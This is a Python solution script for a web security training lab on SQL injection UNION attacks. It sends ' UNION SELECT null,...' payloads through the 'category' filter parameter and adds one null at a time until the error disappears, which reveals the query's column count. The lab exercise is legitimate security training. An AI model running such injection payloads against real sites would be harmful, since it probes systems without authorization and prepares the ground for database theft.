############################################################################
#
# Lab: SQL injection UNION attack, determining the number of columns
#      returned by the query
#
# Hack Steps:
#      1. Inject payload into 'category' query parameter to determine
#         the number of columns
#      2. Add one additional null column at a time
#      3. Repeat this process, increasing the number of columns until you
#         receive a valid response
#
############################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0ac1008b04e00def83ff6f9200810044.web-security-academy.net"

def main():
    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")

    for counter in range(1, 10):
        nulls = "null, " * counter
        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
        
        print(Fore.WHITE + f"❯❯ Trying payload: {payload}")
        
        injection_response = fetch(f"/filter?category={payload}")

        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response):
            print(Fore.WHITE + "⦗#⦘ Number of columns: " + Fore.GREEN + str(counter))
            print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
            
            break
        else:
            continue
    
def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)

def text_not_exist_in_response(text, response):
    result =  re.findall(text, response.text)
    if len(result) == 0:
        return True
    else:
        return False 

if __name__ == "__main__":
    main()